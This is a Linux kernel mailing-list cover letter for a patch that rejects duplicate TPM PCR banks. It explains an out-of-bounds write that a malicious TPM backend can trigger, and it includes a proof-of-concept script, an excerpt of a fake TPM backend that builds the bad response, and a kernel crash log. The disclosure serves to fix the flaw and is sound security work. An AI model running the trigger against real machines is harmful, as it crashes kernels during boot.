Received: from mail-pz2-f42.google.com (mail-pz2-f42.google.com [74.125.228.42])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 35BD2477998
	for <stable@vger.kernel.org>; Mon, 28 Sep 2026 08:27:16 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.228.42
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1790584038; cv=none; b=heO3P87jcsln3o0TORdoslEj2RxMmF8lVyK33DmQKMNiD1abQI2cOslDTLK7E35QOoXdIPmuUIMgDAtZavMALQsuYWqDKwMgm0kIJ2aAeFG6Y/Z6rfvHnnWPEoE5UcvIRcW3zf8t9rJWWmWUK7hYnljmfLReFHKmStYaedIJcwM=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1790584038; c=relaxed/simple;
	bh=d8QXx4ChiRiDIOm45gzMPdgnBaY26o253IUrhGfKAuE=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=dIA7UXbO9/o9K2Dnv9D8at58hYplbPw/VLSuJqS0DkXAagJIG/Zz4CEptokc7TmEMsf8WwokToPNPTEhL3kix82jCV9VjkqZrqMzdkSMafTNKrySB8cbiiKW3YlbSHThiUMZYAFpRz8uvVIIoVY0fL32XvkpTahaVXvPFzLwHaU=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=prhpQ33j; arc=none smtp.client-ip=74.125.228.42
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="prhpQ33j"
Received: by mail-pz2-f42.google.com with SMTP id 41be03b00d2f7-cc4d2fe2056so910538a12.2
        for <stable@vger.kernel.org>; Mon, 28 Sep 2026 01:27:16 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1790584035; x=1791188835; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=RR2+CsTWRIH6BA5IMa5GJVgH+MO3oOWM5IWmo+XxXFA=;
        b=prhpQ33jp5vevkqW8QU+9YtHJQLpcr3eLTmT9pmC/VSxoWTLr+75655E2ajLx0P92n
         525qDICeqdwrJmxHJ63z9ULJOJT6yVxQzDQh5RIf2pVxSj/wiNDN202rydivd7itndCF
         ix8xcorV++uFswzcNP4o7vgVnmNA767kFtcVIpYtur5kwTAe0+zk3hxBUbgyJ3me27n8
         231LuYyAWNHoUPFQuGipwZavNdgfMoPxwSFJo4zhpJAdXNaU8vaqJKR0QYpIUmxTeqZ3
         yUPAW/9EK105cVVMwaDD0ArFZkE3+JLJkOh5bAgFLNpL+aPCED8AnmoH4B/iQvHRVtYr
         aLng==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1790584035; x=1791188835;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=RR2+CsTWRIH6BA5IMa5GJVgH+MO3oOWM5IWmo+XxXFA=;
        b=KF7XHD9BkZFTetUgMVldc9PcRPHTPZROCvDkuTLrj9Z25JrtO2RqULO95yeLFT1Fck
         oDbpkJ9wTRjyGcf3NzlCQ5gSf0oRyJIFjVxn+YewQTA9u0lmyoiSA8j54fQlCr0k6Tz9
         Lripy+pBlJPK/2M/ILMeeapr++1y1TTU0etpRSlSaDz1aqhrHi9LSzPsGFl0vKjszEu3
         kUczGqVDlQWV9Ks7PLYobOVAWXqYKRGBmGGPnMAqAxn7nV3kqGIw4YLzWEOm0Vozt4Cv
         jrslGtcK3Ra+YhrTpPGMs/Yxv4zPo25ayffJqbyOYYkJOy0s+wI2LZ7qyYucdljtBr3E
         09Jg==
X-Forwarded-Encrypted: i=1; AKwUvBx35dzvxQG7wqFH2cwiNaStAEL/64sa84rMmgru+vaXlD9VpmKSf8yvG0OZksU3hObVGIYM2S0=@vger.kernel.org
X-Gm-Message-State: AFq9FYJ485ulEy3dOoJThkxjMTWxv4kpKPEtazxg83AefWmvHvMopPbR
	SiO50RUoPvs9Q9+vIkV5OtRjfNz/asMSYKpLftCCxfvvRGZWyJGO1BwAWc0ekTVXBMdaLA==
X-Gm-Gg: AYBFou3zqJK009ph8x+I2CtsK2L0C7mPYGYMdBdEGmO649RmVtyd627QPPwvFZlln8x
	gYhMg/BohbdafHDyg0/nBzsBl8641LoEagKQw6ZsvWNCFtFAyjEHDnmnDPhBeH1XtVuVuU4q6kZ
	3FnCPx93KpV23GeEuhOxemXY9xaPPEOvHBRhaeGFMFX983QQgdKRNSUGt1azPI2iIK6bym198ML
	fTlfJWrXLFqMZhtgtArjX3w+z123+/u3jq0i1PhYuFC8TV/ol42pD5Q0/nCYa2bACMVJINjvaKw
	r28aQl2ZIrJwYn8fxFnc8v92MFIXdKNgepsqf5vwmdTZ+bQezFvo1DSEQDcIkqDmcy0RGWeAoMK
	Getd7Oa43D6fB5Qay+MuG5Fadc1CGDD6feWgWvEUQuX5urtBoEBnF/E+WCm/S2ysvcU8hvAjAzu
	YaONwq4gdgdGiS/nk54ztjxSL+zq6uzmimXtFgLFslAX0vJF4T6/T1wQUOdFFGhkdDlPTaWWgY0
	FttQ1Crx4X6cRDINIggM6NBTMUVuETjt9oeS985ZYcBW/LXqbR8S+d7VbTf9slg9AhoOwom0KRg
	fxMkRiXr
X-Received: by 2002:a17:90b:3887:b0:3a2:b70b:9cc3 with SMTP id 98e67ed59e1d1-3a2b70bb06emr2056612a91.8.1790584035184;
        Mon, 28 Sep 2026 01:27:15 -0700 (PDT)
Received: from lenovo-thinkbook.lenovo.com (42-2-127-248.static.netvigator.com. [42.2.127.248])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-3a0b9589f7esm19265257a91.10.2026.09.28.01.27.07
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Mon, 28 Sep 2026 01:27:14 -0700 (PDT)
From: Yuqi Xu <xuyuqiabc@gmail.com>
To: linux-integrity@vger.kernel.org
Cc: Peter Huewe <peterhuewe@gmx.de>,
	Jarkko Sakkinen <jarkko@kernel.org>,
	Jason Gunthorpe <jgg@ziepe.ca>,
	Jerry Snitselaar <jsnitsel@redhat.com>,
	James Bottomley <James.Bottomley@HansenPartnership.com>,
	stable@vger.kernel.org,
	Vega <vega@nebusec.ai>,
	Ren Wei <weir@nebusec.ai>,
	xuyq21@lenovo.com
Subject: [PATCH v2 0/1] tpm: reject duplicate PCR banks in tpm2_get_pcr_allocation
Date: Mon, 28 Sep 2026 16:26:59 +0800
Message-ID: <cover.1790568982.git.xuyuqiabc@gmail.com>
X-Mailer: git-send-email 2.55.0
Precedence: bulk
X-Mailing-List: stable@vger.kernel.org
List-Id: <stable.vger.kernel.org>
List-Subscribe: <mailto:stable+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:stable+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated an issue in drivers/char/tpm/tpm2-cmd.c.
The bug is triggered by an attacker-controlled TPM 2.0 backend that
returns duplicate PCR bank selections in its TPM2_CAP_PCRS response
during device probe.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

Changes in v2:
 - Return -EIO on a duplicate PCR bank instead of silently ignoring
   it, as requested by Jarkko Sakkinen.
 - v1 Link: https://lore.kernel.org/all/cover.1789800840.git.xuyuqiabc@gmail.com/

---- details below ----

Bug details:

`struct tpm_chip` reserves `chip->groups` as an array with only
`3 + TPM_MAX_HASHES` slots (8, with TPM_MAX_HASHES = 5).
`tpm2_get_pcr_allocation()` parses the TPM2_CAP_PCRS response and adds
every selection with a non-zero `pcr_select` to `chip->allocated_banks[]`.
It rejects more than `TPM2_MAX_PCR_BANKS` (8) selections but never checks
that the hash algorithm is unique.  `tpm_sysfs_add_device()` then stores
the device group plus one PCR group per allocated bank with
`chip->groups[chip->groups_cnt++]`, so eight duplicate SHA1 banks make it
write index 8 of an 8-element array, before the trailing
`WARN_ON(chip->groups_cnt > TPM_MAX_HASHES + 1)`.

The TPM response is external input: a malicious or buggy TPM 2.0 backend
can report the same bank eight times and drive the out-of-bounds write
during `tpm_chip_register()` -> `tpm_sysfs_add_device()`.

Return -EIO when a hash algorithm is reported twice. The TPM
protocol does not allow that duplicate, so the chip is not enabled
instead of silently dropping the extra selection.

Reproducer:

 cd /root
 ./poc.sh

poc.sh starts malicious_tpm.py, a small swtpm-control-protocol backend
that answers TPM2_CAP_PCRS with eight duplicate SHA1 selections, and boots
a kernel with `-device tpm-tis` pointing at it.  The script defaults
KERNEL_SRC to linux-lts-v6.12.74 and treats tpm-sysfs.c:513 as success.
That default tree is not the build in the crash log below.

The captured run is 7.3.0-rc3-00322-gab411db3c3b1 on a 2 vCPU, 2 GB RAM
x86 QEMU/KVM guest, with CONFIG_TCG_TPM, CONFIG_TCG_TIS and
CONFIG_UBSAN_BOUNDS enabled and panic_on_warn=1 on the command line.
UBSAN in that log reports tpm-sysfs.c:517.  CONFIG_TCG_TPM2_HMAC is
disabled so the probe reaches TPM2_CAP_PCRS without the fake backend
having to answer CREATE_PRIMARY.

------BEGIN poc.sh------

#!/usr/bin/env bash
set -euo pipefail

DIR="$(cd -- "$(dirname -- "$0")" && pwd)"
KERNEL_SRC="${1:-/home/data/data/repos/linux-repos/linux-lts-v6.12.74}"
CTRL_SOCK="$(mktemp -u /tmp/malicious-tpm-XXXXXX.sock)"
BACKEND_LOG="${DIR}/backend.log"
RAW_QEMU_LOG="${DIR}/qemu-raw.log"
QEMU_LOG="${DIR}/qemu.log"

cleanup() {
  if [[ -n "${BACKEND_PID:-}" ]] && kill -0 "${BACKEND_PID}" 2>/dev/null; then
    kill -TERM "${BACKEND_PID}" 2>/dev/null || true
    wait "${BACKEND_PID}" 2>/dev/null || true
  fi
  rm -f "${CTRL_SOCK}"
}
trap cleanup EXIT

: > "${BACKEND_LOG}"

python3 "${DIR}/malicious_tpm.py" --ctrl "${CTRL_SOCK}" --log "${BACKEND_LOG}" &
BACKEND_PID=$!

echo "backend log: ${BACKEND_LOG}"
echo "raw qemu log: ${RAW_QEMU_LOG}"
echo "sanitized qemu log: ${QEMU_LOG}"
echo "The VM should exit on its own after the panic. If it does not, kill the printed pid."

script -q -f "${RAW_QEMU_LOG}" -c "${DIR}/qemu-start-kernel-tpm.sh ${KERNEL_SRC} ${CTRL_SOCK}"
perl -pe 's/\e\[[0-9;?]*[ -\/]*[@-~]//g; s/\ec//g; s/\r//g' "${RAW_QEMU_LOG}" > "${QEMU_LOG}"

if grep -q 'UBSAN: array-index-out-of-bounds in ../drivers/char/tpm/tpm-sysfs.c:513:16' "${QEMU_LOG}" &&
   grep -q 'Kernel panic - not syncing: UBSAN: panic_on_warn set' "${QEMU_LOG}"; then
  echo "Trigger confirmed. See ${QEMU_LOG}"
else
  echo "Trigger not observed. See ${QEMU_LOG} and ${BACKEND_LOG}" >&2
  exit 1
fi

------END poc.sh--------

------BEGIN malicious_tpm.py excerpt------

ALG_SHA1 = 0x0004

def build_get_cap_pcrs():
    entries = []
    for _ in range(8):
        entries.append(be16(ALG_SHA1) + b"\x03" + b"\x01\x00\x00")
    payload = b"\x00" + be32(TPM2_CAP_PCRS) + be32(8) + b"".join(entries)
    return build_header(TPM2_RC_SUCCESS, payload)

        if cap == TPM2_CAP_PCRS:
            return build_get_cap_pcrs()

------END malicious_tpm.py excerpt------

Captured 7.3.0-rc3 log (7.3.0-rc3-00322-gab411db3c3b1).  This is not
the script's default linux-lts-v6.12.74 tree.

----BEGIN crash log----

[    0.487531] ------------[ cut here ]------------
[    0.487533] UBSAN: array-index-out-of-bounds in /home/lucas/work/net-tpm-675/drivers/char/tpm/tpm-sysfs.c:517:16
[    0.487535] index 8 is out of range for type 'attribute_group *[8]'
[    0.487538] CPU: 0 UID: 0 PID: 1 Comm: swapper/0 Not tainted 7.3.0-rc3-00322-gab411db3c3b1 #2 PREEMPT(lazy) 
[    0.487541] Hardware name: QEMU Standard PC (Q35 + ICH9, 2009), BIOS 1.17.0-10.fc44 06/10/2025
[    0.487542] Call Trace:
[    0.487553]  <TASK>
[    0.487555]  dump_stack_lvl+0x4d/0x70
[    0.487561]  ubsan_epilogue+0x5/0x2b
[    0.487564]  __ubsan_handle_out_of_bounds.cold+0x4e/0x58
[    0.487567]  tpm_sysfs_add_device+0x29f/0x380
[    0.487573]  tpm_chip_register+0x3d/0x1e0
[    0.487576]  ? srso_alias_return_thunk+0x5/0xfbef5
[    0.487579]  ? srso_alias_return_thunk+0x5/0xfbef5
[    0.487580]  tpm_tis_core_init.cold+0x1bc/0x3a1
[    0.487584]  tpm_tis_plat_probe+0x101/0x130
[    0.487588]  ? srso_alias_return_thunk+0x5/0xfbef5
[    0.487590]  platform_probe+0x74/0xc0
[    0.487594]  ? driver_sysfs_add+0x50/0x80
[    0.487596]  really_probe+0xdd/0x290
[    0.487597]  ? srso_alias_return_thunk+0x5/0xfbef5
[    0.487599]  __driver_probe_device+0x99/0x180
[    0.487601]  ? __pfx___driver_attach+0x10/0x10
[    0.487602]  driver_probe_device+0x1a/0xa0
[    0.487604]  ? __pfx___driver_attach+0x10/0x10
[    0.487605]  __driver_attach+0xab/0x180
[    0.487607]  ? srso_alias_return_thunk+0x5/0xfbef5
[    0.487608]  bus_for_each_dev+0x92/0xf0
[    0.487611]  bus_add_driver+0x104/0x220
[    0.487613]  ? __pfx_init_tis+0x10/0x10
[    0.487617]  driver_register+0x70/0xe0
[    0.487619]  init_tis+0x9b/0xf0
[    0.487623]  do_one_initcall+0x84/0x260
[    0.487626]  kernel_init_freeable+0x249/0x2c0
[    0.487630]  ? __pfx_kernel_init+0x10/0x10
[    0.487633]  kernel_init+0x1b/0x140
[    0.487635]  ? __pfx_kernel_init+0x10/0x10
[    0.487637]  ret_from_fork+0x196/0x260
[    0.487640]  ? __pfx_kernel_init+0x10/0x10
[    0.487641]  ? __pfx_kernel_init+0x10/0x10
[    0.487643]  ret_from_fork_asm+0x1a/0x30
[    0.487646]  </TASK>
[    0.487647] ---[ end trace ]---
[    0.487648] Kernel panic - not syncing: UBSAN: panic_on_warn set ...

-----END crash log-----

Best regards,
Yuqi Xu

Yuqi Xu (1):
  tpm: reject duplicate PCR banks in tpm2_get_pcr_allocation

 drivers/char/tpm/tpm2-cmd.c | 18 ++++++++++++++++++
 1 file changed, 18 insertions(+)


base-commit: ab411db3c3b1fd0c70a36fb32c96b2c60175210b
-- 
2.55.0
